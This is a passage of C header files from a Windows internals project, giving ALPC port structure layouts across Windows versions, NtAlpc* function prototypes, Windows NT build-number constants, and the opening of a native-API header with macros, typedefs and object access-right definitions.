            unsigned long Lpc : 1; /* bit position: 12 */
            unsigned long LpcToLpc : 1; /* bit position: 13 */
            unsigned long HasCompletionList : 1; /* bit position: 14 */
            unsigned long HadCompletionList : 1; /* bit position: 15 */
            unsigned long EnableCompletionList : 1; /* bit position: 16 */
        } s1;
        /* 0x0184 */ unsigned long State;
    } u1;
    /* 0x0188 */ struct _ALPC_PORT* TargetQueuePort;
    /* 0x0190 */ struct _ALPC_PORT* TargetSequencePort;
    /* 0x0198 */ struct _KALPC_MESSAGE* CachedMessage;
    /* 0x01a0 */ unsigned long MainQueueLength;
    /* 0x01a4 */ unsigned long LargeMessageQueueLength;
    /* 0x01a8 */ unsigned long PendingQueueLength;
    /* 0x01ac */ unsigned long CanceledQueueLength;
    /* 0x01b0 */ unsigned long WaitQueueLength;
    /* 0x01b4 */ long __PADDING__[1];
} ALPC_PORT_9200, *PALPC_PORT_9200; /* size: 0x01b8 */

//
// Windows 8.1 ALPC port object.
//
typedef struct _ALPC_PORT_9600 {
    /* 0x0000 */ struct _LIST_ENTRY PortListEntry;
    /* 0x0010 */ struct _ALPC_COMMUNICATION_INFO_V2* CommunicationInfo;
    /* 0x0018 */ struct _EPROCESS* OwnerProcess;
    /* 0x0020 */ void* CompletionPort;
    /* 0x0028 */ void* CompletionKey;
    /* 0x0030 */ struct _ALPC_COMPLETION_PACKET_LOOKASIDE* CompletionPacketLookaside;
    /* 0x0038 */ void* PortContext;
    /* 0x0040 */ struct _SECURITY_CLIENT_CONTEXT StaticSecurity;
    /* 0x0088 */ struct _EX_PUSH_LOCK IncomingQueueLock;
    /* 0x0090 */ struct _LIST_ENTRY MainQueue;
    /* 0x00a0 */ struct _LIST_ENTRY LargeMessageQueue;
    /* 0x00b0 */ struct _EX_PUSH_LOCK PendingQueueLock;
    /* 0x00b8 */ struct _LIST_ENTRY PendingQueue;
    /* 0x00c8 */ struct _EX_PUSH_LOCK WaitQueueLock;
    /* 0x00d0 */ struct _LIST_ENTRY WaitQueue;
    union
    {
        /* 0x00e0 */ struct _KSEMAPHORE* Semaphore;
        /* 0x00e0 */ struct _KEVENT* DummyEvent;
    }; /* size: 0x0008 */
    /* 0x00e8 */ struct _ALPC_PORT_ATTRIBUTES PortAttributes;
    /* 0x0130 */ struct _EX_PUSH_LOCK ResourceListLock;
    /* 0x0138 */ struct _LIST_ENTRY ResourceListHead;
    /* 0x0148 */ struct _EX_PUSH_LOCK PortObjectLock;
    /* 0x0150 */ struct _ALPC_COMPLETION_LIST* CompletionList;
    /* 0x0158 */ struct _CALLBACK_OBJECT* CallbackObject;
    /* 0x0160 */ void* CallbackContext;
    /* 0x0168 */ struct _LIST_ENTRY CanceledQueue;
    /* 0x0178 */ long SequenceNo;
    /* 0x017c */ long ReferenceNo;
    /* 0x0180 */ struct _PALPC_PORT_REFERENCE_WAIT_BLOCK* ReferenceNoWait;
    union
    {
        struct
        {
            unsigned long Initialized : 1; /* bit position: 0 */
            unsigned long Type : 2; /* bit position: 1 */
            unsigned long ConnectionPending : 1; /* bit position: 3 */
            unsigned long ConnectionRefused : 1; /* bit position: 4 */
            unsigned long Disconnected : 1; /* bit position: 5 */
            unsigned long Closed : 1; /* bit position: 6 */
            unsigned long NoFlushOnClose : 1; /* bit position: 7 */
            unsigned long ReturnExtendedInfo : 1; /* bit position: 8 */
            unsigned long Waitable : 1; /* bit position: 9 */
            unsigned long DynamicSecurity : 1; /* bit position: 10 */
            unsigned long Wow64CompletionList : 1; /* bit position: 11 */
            unsigned long Lpc : 1; /* bit position: 12 */
            unsigned long LpcToLpc : 1; /* bit position: 13 */
            unsigned long HasCompletionList : 1; /* bit position: 14 */
            unsigned long HadCompletionList : 1; /* bit position: 15 */
            unsigned long EnableCompletionList : 1; /* bit position: 16 */
        } s1;
        /* 0x0188 */ unsigned long State;
    } u1;
    /* 0x0190 */ struct _ALPC_PORT* TargetQueuePort;
    /* 0x0198 */ struct _ALPC_PORT* TargetSequencePort;
    /* 0x01a0 */ struct _KALPC_MESSAGE* CachedMessage;
    /* 0x01a8 */ unsigned long MainQueueLength;
    /* 0x01ac */ unsigned long LargeMessageQueueLength;
    /* 0x01b0 */ unsigned long PendingQueueLength;
    /* 0x01b4 */ unsigned long CanceledQueueLength;
    /* 0x01b8 */ unsigned long WaitQueueLength;
    /* 0x01bc */ long __PADDING__[1];
} ALPC_PORT_9600, *PALPC_PORT_9600; /* size: 0x01c0 */

//
// Windows 10 (10240 - 18290) ALPC port object.
//
typedef struct _ALPC_PORT_10240 {
    /* 0x0000 */ struct _LIST_ENTRY PortListEntry;
    /* 0x0010 */ struct _ALPC_COMMUNICATION_INFO_V2* CommunicationInfo;
    /* 0x0018 */ struct _EPROCESS* OwnerProcess;
    /* 0x0020 */ void* CompletionPort;
    /* 0x0028 */ void* CompletionKey;
    /* 0x0030 */ struct _ALPC_COMPLETION_PACKET_LOOKASIDE* CompletionPacketLookaside;
    /* 0x0038 */ void* PortContext;
    /* 0x0040 */ struct _SECURITY_CLIENT_CONTEXT StaticSecurity;
    /* 0x0088 */ struct _EX_PUSH_LOCK IncomingQueueLock;
    /* 0x0090 */ struct _LIST_ENTRY MainQueue;
    /* 0x00a0 */ struct _LIST_ENTRY LargeMessageQueue;
    /* 0x00b0 */ struct _EX_PUSH_LOCK PendingQueueLock;
    /* 0x00b8 */ struct _LIST_ENTRY PendingQueue;
    /* 0x00c8 */ struct _EX_PUSH_LOCK DirectQueueLock;
    /* 0x00d0 */ struct _LIST_ENTRY DirectQueue;
    /* 0x00e0 */ struct _EX_PUSH_LOCK WaitQueueLock;
    /* 0x00e8 */ struct _LIST_ENTRY WaitQueue;
    union
    {
        /* 0x00f8 */ struct _KSEMAPHORE* Semaphore;
        /* 0x00f8 */ struct _KEVENT* DummyEvent;
    }; /* size: 0x0008 */
    /* 0x0100 */ struct _ALPC_PORT_ATTRIBUTES PortAttributes;
    /* 0x0148 */ struct _EX_PUSH_LOCK ResourceListLock;
    /* 0x0150 */ struct _LIST_ENTRY ResourceListHead;
    /* 0x0160 */ struct _EX_PUSH_LOCK PortObjectLock;
    /* 0x0168 */ struct _ALPC_COMPLETION_LIST* CompletionList;
    /* 0x0170 */ struct _CALLBACK_OBJECT* CallbackObject;
    /* 0x0178 */ void* CallbackContext;
    /* 0x0180 */ struct _LIST_ENTRY CanceledQueue;
    /* 0x0190 */ long SequenceNo;
    /* 0x0194 */ long ReferenceNo;
    /* 0x0198 */ struct _PALPC_PORT_REFERENCE_WAIT_BLOCK* ReferenceNoWait;
    union
    {
        struct /* bitfield */
        {
            /* 0x01a0 */ unsigned long Initialized : 1; /* bit position: 0 */
            /* 0x01a0 */ unsigned long Type : 2; /* bit position: 1 */
            /* 0x01a0 */ unsigned long ConnectionPending : 1; /* bit position: 3 */
            /* 0x01a0 */ unsigned long ConnectionRefused : 1; /* bit position: 4 */
            /* 0x01a0 */ unsigned long Disconnected : 1; /* bit position: 5 */
            /* 0x01a0 */ unsigned long Closed : 1; /* bit position: 6 */
            /* 0x01a0 */ unsigned long NoFlushOnClose : 1; /* bit position: 7 */
            /* 0x01a0 */ unsigned long ReturnExtendedInfo : 1; /* bit position: 8 */
            /* 0x01a0 */ unsigned long Waitable : 1; /* bit position: 9 */
            /* 0x01a0 */ unsigned long DynamicSecurity : 1; /* bit position: 10 */
            /* 0x01a0 */ unsigned long Wow64CompletionList : 1; /* bit position: 11 */
            /* 0x01a0 */ unsigned long Lpc : 1; /* bit position: 12 */
            /* 0x01a0 */ unsigned long LpcToLpc : 1; /* bit position: 13 */
            /* 0x01a0 */ unsigned long HasCompletionList : 1; /* bit position: 14 */
            /* 0x01a0 */ unsigned long HadCompletionList : 1; /* bit position: 15 */
            /* 0x01a0 */ unsigned long EnableCompletionList : 1; /* bit position: 16 */
        } s1;
        /* 0x01a0 */ unsigned long State;
    } u1;
    /* 0x01a8 */ struct _ALPC_PORT* TargetQueuePort;
    /* 0x01b0 */ struct _ALPC_PORT* TargetSequencePort;
    /* 0x01b8 */ struct _KALPC_MESSAGE* CachedMessage;
    /* 0x01c0 */ unsigned long MainQueueLength;
    /* 0x01c4 */ unsigned long LargeMessageQueueLength;
    /* 0x01c8 */ unsigned long PendingQueueLength;
    /* 0x01cc */ unsigned long DirectQueueLength;
    /* 0x01d0 */ unsigned long CanceledQueueLength;
    /* 0x01d4 */ unsigned long WaitQueueLength;
} ALPC_PORT_10240, *PALPC_PORT_10240; /* size: 0x01d8 */

NTSYSAPI
NTSTATUS 
NTAPI 
NtAlpcCreatePort(
    _Out_ PHANDLE PortHandle,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PALPC_PORT_ATTRIBUTES PortAttributes);

NTSYSAPI
NTSTATUS 
NTAPI 
NtAlpcDisconnectPort(
    _In_ HANDLE PortHandle,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS 
NTAPI 
NtAlpcQueryInformation(
    _In_ HANDLE PortHandle,
    _In_ ALPC_PORT_INFORMATION_CLASS PortInformationClass,
    _Inout_updates_bytes_to_(Length, *ReturnLength) PVOID PortInformation,
    _In_ ULONG Length,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtAlpcAcceptConnectPort(
    _Out_ PHANDLE PortHandle,
    _In_ HANDLE ConnectionPortHandle,
    _In_ ULONG Flags,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PALPC_PORT_ATTRIBUTES PortAttributes,
    _In_opt_ PVOID PortContext,
    _In_opt_ PPORT_MESSAGE ConnectionRequest,
    _Inout_opt_ PALPC_MESSAGE_ATTRIBUTES ConnectionMessageAttributes,
    _In_ BOOLEAN AcceptConnection);

NTSYSAPI
NTSTATUS
NTAPI
NtAlpcSendWaitReceivePort(
    _In_ HANDLE PortHandle,
    _In_ ULONG Flags,
    _In_opt_ PPORT_MESSAGE pSendMessage,
    _Inout_opt_ PALPC_MESSAGE_ATTRIBUTES SendMessageAttributes,
    _Out_opt_ PPORT_MESSAGE pReceiveMessage,
    _Inout_opt_ PSIZE_T BufferLength,
    _Inout_opt_ PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes,
    _In_opt_ PLARGE_INTEGER Timeout);

//
// NTALPC_RTL HEADER END
//

#ifdef __cplusplus
}
#endif

#pragma warning(pop)

#endif NTALPC_RTL

```

`Source/Shared/ntos/ntbuilds.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2021 - 2025
*
*  TITLE:       NTBUILDS.H
*
*  VERSION:     1.28
*
*  DATE:        18 Sep 2025
*
*  Windows NT builds definition file.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

//
// Defines for Major Windows NT release builds
//

// Windows 7 RTM
#define NT_WIN7_RTM             7600

// Windows 7 SP1
#define NT_WIN7_SP1             7601

// Windows 8 RTM
#define NT_WIN8_RTM             9200

// Windows 8.1
#define NT_WIN8_BLUE            9600

// Windows 10 TH1
#define NT_WIN10_THRESHOLD1     10240

// Windows 10 TH2
#define NT_WIN10_THRESHOLD2     10586

// Windows 10 RS1
#define NT_WIN10_REDSTONE1      14393

// Windows 10 RS2
#define NT_WIN10_REDSTONE2      15063

// Windows 10 RS3
#define NT_WIN10_REDSTONE3      16299

// Windows 10 RS4
#define NT_WIN10_REDSTONE4      17134

// Windows 10 RS5
#define NT_WIN10_REDSTONE5      17763

// Windows 10 19H1
#define NT_WIN10_19H1           18362

// Windows 10 19H2
#define NT_WIN10_19H2           18363

// Windows 10 20H1
#define NT_WIN10_20H1           19041

// Windows 10 20H2
#define NT_WIN10_20H2           19042

// Windows 10 21H1
#define NT_WIN10_21H1           19043

// Windows 10 21H2
#define NT_WIN10_21H2           19044

// Windows 10 22H2
#define NT_WIN10_22H2           19045

// Windows Server 2022
#define NT_WINSRV_21H1          20348

// Windows 11 21H2
#define NT_WIN11_21H2           22000

// Windows 11 22H2
#define NT_WIN11_22H2           22621

// Windows 11 23H2
#define NT_WIN11_23H2           22631

// Windows 11 24H2
#define NT_WIN11_24H2           26100

// Windows 11 25H2
#define NT_WIN11_25H2           26200

// Windows 11 Active Development Branch
#define NT_WIN11_ADB            27943

```

`Source/Shared/ntos/ntos.h`:

```h
/************************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2025
*  Translated from Microsoft sources/debugger or mentioned elsewhere.
*
*  TITLE:       NTOS.H
*
*  VERSION:     1.240
*
*  DATE:        02 Dec 2025
*
*  Common header file for the ntos API functions and definitions.
*
*  Only projects required API/definitions.
*
*  Depends on:    Windows.h
*                 NtStatus.h
*
*  Include:       Windows.h
*                 NtStatus.h
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
************************************************************************************/

#if defined (_MSC_VER) && (_MSC_VER >= 1020)
#pragma once
#endif

#pragma warning(push)
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
#pragma warning(disable: 4214) // nonstandard extension used : bit field types other than int

#ifndef NTOS_RTL
#define NTOS_RTL

//
// NTOS_RTL HEADER BEGIN
//

//
// Enable LIST_ENTRY macroses.
//
#define NTOS_ENABLE_LIST_ENTRY_MACRO

#if defined(__cplusplus)

#ifndef MICROSOFT_WINDOWS_WINBASE_H_DEFINE_INTERLOCKED_CPLUSPLUS_OVERLOADS
#define MICROSOFT_WINDOWS_WINBASE_H_DEFINE_INTERLOCKED_CPLUSPLUS_OVERLOADS 0
#endif

extern "C" {
#endif

#pragma comment(lib, "ntdll.lib")

#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000ull
#endif
#ifndef PAGE_MASK
#define PAGE_MASK 0xFFF
#endif
#ifndef PAGE_SHIFT
#define PAGE_SHIFT 0xC
#endif

#ifndef ABSOLUTE_TIME
#define ABSOLUTE_TIME(wait) (wait)
#endif

#ifndef RELATIVE_TIME
#define RELATIVE_TIME(wait) (-(wait))
#endif

#ifndef NANOSECONDS
#define NANOSECONDS(nanos) (((signed __int64)(nanos)) / 100L)
#endif

#ifndef MICROSECONDS
#define MICROSECONDS(micros) (((signed __int64)(micros)) * NANOSECONDS(1000L))
#endif

#ifndef MILLISECONDS
#define MILLISECONDS(milli) (((signed __int64)(milli)) * MICROSECONDS(1000L))
#endif

#ifndef SECONDS
#define SECONDS(seconds) (((signed __int64)(seconds)) * MILLISECONDS(1000L))
#endif

#ifndef POI //poi-poi
#define POI(addr) *(ULONG *)(addr)
#endif

typedef char CCHAR;
typedef unsigned char UCHAR;
typedef CCHAR KPROCESSOR_MODE;
typedef UCHAR KIRQL;
typedef KIRQL *PKIRQL;
typedef ULONG CLONG;
typedef LONG KPRIORITY;
typedef short CSHORT;
typedef ULONGLONG REGHANDLE, *PREGHANDLE;
typedef PVOID *PDEVICE_MAP;
typedef PVOID PHEAD;
typedef PVOID PEJOB;
typedef PVOID PKTHREAD;
typedef struct _IO_TIMER* PIO_TIMER;
typedef LARGE_INTEGER PHYSICAL_ADDRESS;
typedef struct _EJOB* PESILO;

#ifndef _WIN32_WINNT_WIN10
#define _WIN32_WINNT_WIN10 0x0A00
#endif
#if (_WIN32_WINNT < _WIN32_WINNT_WIN10)
typedef PVOID PMEM_EXTENDED_PARAMETER;
#endif

#ifndef IN_REGION
#define IN_REGION(x, Base, Size) ( \
    (((ULONG_PTR)(Base) + (ULONG_PTR)(Size)) > (ULONG_PTR)(Base)) && \
    /* x within [Base, Base+Size) */ \
    (((ULONG_PTR)(x) >= (ULONG_PTR)(Base)) && ((ULONG_PTR)(x) < ((ULONG_PTR)(Base) + (ULONG_PTR)(Size)))))
#endif

#define PE_SIGNATURE_SIZE           4
#ifndef RTL_MEG
#define RTL_MEG                     (1024UL * 1024UL)
#endif
#ifndef RTLP_IMAGE_MAX_DOS_HEADER
#define RTLP_IMAGE_MAX_DOS_HEADER   (256UL * RTL_MEG)
#endif
#ifndef MM_SIZE_OF_LARGEST_IMAGE
#define MM_SIZE_OF_LARGEST_IMAGE    ((ULONG)0x77000000)
#endif
#ifndef MM_MAXIMUM_IMAGE_HEADER
#define MM_MAXIMUM_IMAGE_HEADER     (2 * PAGE_SIZE)
#endif
#ifndef MM_MAXIMUM_IMAGE_SECTIONS
#define MM_MAXIMUM_IMAGE_SECTIONS                       \
     ((MM_MAXIMUM_IMAGE_HEADER - (PAGE_SIZE + sizeof(IMAGE_NT_HEADERS))) /  \
            sizeof(IMAGE_SECTION_HEADER))
#endif

//
// Define alignment macros to align structure sizes and pointers up and down.
//

#ifndef ALIGN_UP_TYPE
#define ALIGN_UP_TYPE(Address, Align) (((ULONG_PTR)(Address) + (Align) - 1) & ~((Align) - 1))
#endif

#ifndef ALIGN_UP
#define ALIGN_UP(Address, Type) ALIGN_UP_TYPE(Address, sizeof(Type))
#endif

#ifndef ALIGN_DOWN_TYPE
#define ALIGN_DOWN_TYPE(Address, Align) ((ULONG_PTR)(Address) & ~((ULONG_PTR)(Align) - 1))
#endif

#ifndef ALIGN_DOWN
#define ALIGN_DOWN(Address, Type) ALIGN_DOWN_TYPE(Address, sizeof(Type))
#endif

#ifndef ALIGN_UP_BY
#define ALIGN_UP_BY(Address, Align) (((ULONG_PTR)(Address) + (Align) - 1) & ~((Align) - 1))
#endif

#ifndef ALIGN_DOWN_BY
#define ALIGN_DOWN_BY(Address, Align) ((ULONG_PTR)(Address) & ~((ULONG_PTR)(Align) - 1))
#endif

#ifndef ALIGN_UP_POINTER_BY
#define ALIGN_UP_POINTER_BY(Pointer, Align) ((PVOID)ALIGN_UP_BY(Pointer, Align))
#endif

#ifndef ALIGN_DOWN_POINTER_BY
#define ALIGN_DOWN_POINTER_BY(Pointer, Align) ((PVOID)ALIGN_DOWN_BY(Pointer, Align))
#endif

#ifndef ALIGN_UP_POINTER
#define ALIGN_UP_POINTER(Pointer, Type) ((PVOID)ALIGN_UP(Pointer, Type))
#endif

#ifndef ALIGN_DOWN_POINTER
#define ALIGN_DOWN_POINTER(Pointer, Type) ((PVOID)ALIGN_DOWN(Pointer, Type))
#endif

#ifndef ARGUMENT_PRESENT
#define ARGUMENT_PRESENT(ArgumentPointer)    (\
    (CHAR *)((ULONG_PTR)(ArgumentPointer)) != (CHAR *)(NULL) )
#endif

#ifndef LOGICAL
#define LOGICAL ULONG
#endif

#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define ZwCurrentProcess() NtCurrentProcess()
#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)
#define ZwCurrentThread() NtCurrentThread()
#define NtCurrentSession() ((HANDLE)(LONG_PTR)-3)
#define ZwCurrentSession() NtCurrentSession()

//Valid Only for Windows 8+
#define NtCurrentProcessToken() ((HANDLE)(LONG_PTR)-4) 
#define NtCurrentThreadToken() ((HANDLE)(LONG_PTR)-5)
#define NtCurrentThreadEffectiveToken() ((HANDLE)(LONG_PTR)-6) //GetCurrentThreadEffectiveToken

enum _KPROCESSOR_MODE {
    KernelMode = 0,
    UserMode,
    MaximumMode
};

//
// ntdef.h begin
//
#ifndef RTL_CONSTANT_STRING
char _RTL_CONSTANT_STRING_type_check(const void *s);
#define _RTL_CONSTANT_STRING_remove_const_macro(s) (s)
#define RTL_CONSTANT_STRING(s) \
{ \
    sizeof( s ) - sizeof( (s)[0] ), \
    sizeof( s ) / sizeof(_RTL_CONSTANT_STRING_type_check(s)), \
    _RTL_CONSTANT_STRING_remove_const_macro(s) \
}
#endif

#ifndef RTL_CONSTANT_OBJECT_ATTRIBUTES
#define RTL_CONSTANT_OBJECT_ATTRIBUTES(n, a) \
    { sizeof(OBJECT_ATTRIBUTES), NULL, RTL_CONST_CAST(PUNICODE_STRING)(n), a, NULL, NULL }
#endif

// This synonym is more appropriate for initializing what isn't actually const.
#ifndef RTL_INIT_OBJECT_ATTRIBUTES
#define RTL_INIT_OBJECT_ATTRIBUTES(n, a) RTL_CONSTANT_OBJECT_ATTRIBUTES(n, a)
#endif

//
// ntdef.h end
//
#ifndef RtlOffsetToPointer
#define RtlOffsetToPointer(Base, Offset)  ((PCHAR)( ((PCHAR)(Base)) + ((ULONG_PTR)(Offset))  ))
#endif

#ifndef RtlPointerToOffset
#define RtlPointerToOffset(Base, Pointer)  ((ULONG)( ((PCHAR)(Pointer)) - ((PCHAR)(Base))  ))
#endif

//
// Valid values for the OBJECT_ATTRIBUTES.Attributes field
//
#define OBJ_INHERIT                         0x00000002L
#define OBJ_PERMANENT                       0x00000010L
#define OBJ_EXCLUSIVE                       0x00000020L
#define OBJ_CASE_INSENSITIVE                0x00000040L
#define OBJ_OPENIF                          0x00000080L
#define OBJ_OPENLINK                        0x00000100L
#define OBJ_KERNEL_HANDLE                   0x00000200L
#define OBJ_FORCE_ACCESS_CHECK              0x00000400L
#define OBJ_IGNORE_IMPERSONATED_DEVICEMAP   0x00000800L
#define OBJ_DONT_REPARSE                    0x00001000L
#define OBJ_VALID_ATTRIBUTES                0x00001FF2L

#define OBJ_PROTECT_CLOSE                   0x00000001L
#define OBJ_AUDIT_OBJECT_CLOSE              0x00000004L

//
// Callback Object Rights
//
#define CALLBACK_MODIFY_STATE    0x0001
#define CALLBACK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|CALLBACK_MODIFY_STATE )

//
// CompositionSurface Access Rights
//
#ifndef COMPOSITIONSURFACE_READ
#define COMPOSITIONSURFACE_READ         0x0001L
#endif

#ifndef COMPOSITIONSURFACE_WRITE
#define COMPOSITIONSURFACE_WRITE        0x0002L
#endif

#ifndef COMPOSITIONSURFACE_ALL_ACCESS
#define COMPOSITIONSURFACE_ALL_ACCESS   (COMPOSITIONSURFACE_READ | COMPOSITIONSURFACE_WRITE)
#endif

//
// Debug Object Access Rights
//
#define DEBUG_READ_EVENT        (0x0001)
#define DEBUG_PROCESS_ASSIGN    (0x0002)
#define DEBUG_SET_INFORMATION   (0x0004)
#define DEBUG_QUERY_INFORMATION (0x0008)
#define DEBUG_ALL_ACCESS     (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|DEBUG_READ_EVENT|DEBUG_PROCESS_ASSIGN|\
                              DEBUG_SET_INFORMATION|DEBUG_QUERY_INFORMATION)

//
// Directory Object Access Rights
//
#define DIRECTORY_QUERY                 (0x0001)
#define DIRECTORY_TRAVERSE              (0x0002)
#define DIRECTORY_CREATE_OBJECT         (0x0004)
#define DIRECTORY_CREATE_SUBDIRECTORY   (0x0008)
#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)

//
// Event Object Access Rights
//
#ifndef EVENT_QUERY_STATE
#define EVENT_QUERY_STATE       0x0001
#endif

#ifndef EVENT_MODIFY_STATE      //SDK compatibility
#define EVENT_MODIFY_STATE      0x0002  
#endif

#ifndef EVENT_ALL_ACCESS        //SDK compatibility
#define EVENT_ALL_ACCESS(EVENT_QUERY_STATE | EVENT_MODIFY_STATE | STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE)
#endif

//
// EventPair Object Access Rights
//
#define EVENT_PAIR_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE)

//
// I/O Completion Object Access Rights
//
#define IO_COMPLETION_QUERY_STATE   0x0001
#define IO_COMPLETION_MODIFY_STATE  0x0002  
#define IO_COMPLETION_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|0x3) 

//
// KeyedEvent Object Access Rights
//
#define KEYEDEVENT_WAIT 0x0001
#define KEYEDEVENT_WAKE 0x0002
#define KEYEDEVENT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | KEYEDEVENT_WAIT | KEYEDEVENT_WAKE)

//
// Mutant Object Access Rights
//
#ifndef MUTANT_QUERY_STATE      //SDK compatibility
#define MUTANT_QUERY_STATE      0x0001
#endif

#ifndef MUTANT_ALL_ACCESS //SDK compatibility
#define MUTANT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|MUTANT_QUERY_STATE)
#endif

//
// Port Object Access Rights
//
#define PORT_CONNECT (0x0001)
#define PORT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | PORT_CONNECT)

//
// Filter Port Access Rights
//
#define FLT_PORT_CONNECT 0x0001
#define FLT_PORT_ALL_ACCESS (FLT_PORT_CONNECT|STANDARD_RIGHTS_ALL)

//
// Profile Object Access Rights
//
#define PROFILE_CONTROL (0x0001)
#define PROFILE_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | PROFILE_CONTROL)

//
// Semaphore Object Access Rights
//
#ifndef SEMAPHORE_QUERY_STATE       //SDK compatibility
#define SEMAPHORE_QUERY_STATE       0x0001
#endif

#ifndef SEMAPHORE_MODIFY_STATE      //SDK compatibility
#define SEMAPHORE_MODIFY_STATE      0x0002 
#endif

#ifndef SEMAPHORE_ALL_ACCESS //SDK compatibility
#define SEMAPHORE_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|SEMAPHORE_QUERY_STATE|SEMAPHORE_MODIFY_STATE)
#endif

//
// Time Object Access rights
//
#ifndef TIMER_QUERY_STATE
#define TIMER_QUERY_STATE 0x0001
#endif

#ifndef TIMER_MODIFY_STATE
#define TIMER_MODIFY_STATE 0x0002
#endif

#ifndef TIMER_ALL_ACCESS
#define TIMER_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|TIMER_QUERY_STATE|TIMER_MODIFY_STATE)
#endif

//
// SymbolicLink Object Access Rights
//
#define SYMBOLIC_LINK_QUERY 0x0001
#define SYMBOLIC_LINK_SET   0x0002
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYMBOLIC_LINK_QUERY)
#define SYMBOLIC_LINK_ALL_ACCESS_EX (STANDARD_RIGHTS_REQUIRED | 0xFFFF)

//
// Thread Object Access Rights
//
#define THREAD_ALERT   (0x0004)

#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED        0x00000001
#define THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH      0x00000002 
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER      0x00000004
#define THREAD_CREATE_FLAGS_HAS_SECURITY_DESCRIPTOR 0x00000010 
#define THREAD_CREATE_FLAGS_ACCESS_CHECK_IN_TARGET  0x00000020
#define THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE   0x00000040
#define THREAD_CREATE_FLAGS_INITIAL_THREAD          0x00000080

//
// Worker Factory Object Access Rights
//
#define WORKER_FACTORY_RELEASE_WORKER       0x0001
#define WORKER_FACTORY_WAIT                 0x0002
#define WORKER_FACTORY_SET_INFORMATION      0x0004
#define WORKER_FACTORY_QUERY_INFORMATION    0x0008
#define WORKER_FACTORY_READY_WORKER         0x0010
#define WORKER_FACTORY_SHUTDOWN             0x0020

#define WORKER_FACTORY_ALL_ACCESS ( \
    STANDARD_RIGHTS_REQUIRED | \
    WORKER_FACTORY_RELEASE_WORKER | \
    WORKER_FACTORY_WAIT | \
    WORKER_FACTORY_SET_INFORMATION | \
    WORKER_FACTORY_QUERY_INFORMATION | \
    WORKER_FACTORY_READY_WORKER | \
    WORKER_FACTORY_SHUTDOWN \
    )

//
// Type Object Access Rights
//
#define OBJECT_TYPE_CREATE (0x0001)
#define OBJECT_TYPE_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | OBJECT_TYPE_CREATE)

//
// WMI Object Access Rights
//
#define WMIGUID_QUERY                 0x0001
#define WMIGUID_SET                   0x0002
#define WMIGUID_NOTIFICATION          0x0004
#define WMIGUID_READ_DESCRIPTION      0x0008
#define WMIGUID_EXECUTE               0x0010
#define TRACELOG_CREATE_REALTIME      0x0020
#define TRACELOG_CREATE_ONDISK        0x0040
#define TRACELOG_GUID_ENABLE          0x0080
#define TRACELOG_ACCESS_KERNEL_LOGGER 0x0100
#define TRACELOG_LOG_EVENT            0x0200 // used on Vista and greater
#define TRACELOG_CREATE_INPROC        0x0200 // used pre-Vista
#define TRACELOG_ACCESS_REALTIME      0x0400
#define TRACELOG_REGISTER_GUIDS       0x0800
#define TRACELOG_JOIN_GROUP           0x1000

//
// Memory Partition Object Access Rights
//
#ifndef MEMORY_PARTITION_QUERY_ACCESS
#define MEMORY_PARTITION_QUERY_ACCESS  0x0001
#define MEMORY_PARTITION_MODIFY_ACCESS 0x0002

#define MEMORY_PARTITION_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED |         \
                                     SYNCHRONIZE |                      \
                                     MEMORY_PARTITION_QUERY_ACCESS |    \
                                     MEMORY_PARTITION_MODIFY_ACCESS)
#endif

//
// Define special ByteOffset parameters for read and write operations
//
#ifndef FILE_WRITE_TO_END_OF_FILE
#define FILE_WRITE_TO_END_OF_FILE       0xffffffff
#endif
#ifndef FILE_USE_FILE_POINTER_POSITION
#define FILE_USE_FILE_POINTER_POSITION  0xfffffffe
#endif

#ifndef FILE_SHARE_VALID_FLAGS
#define FILE_SHARE_VALID_FLAGS FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
#endif

//
// This is the maximum MaximumLength for a UNICODE_STRING.
//
#ifndef MAXUSHORT
#define MAXUSHORT   0xffff     
#endif
#ifndef MAX_USTRING
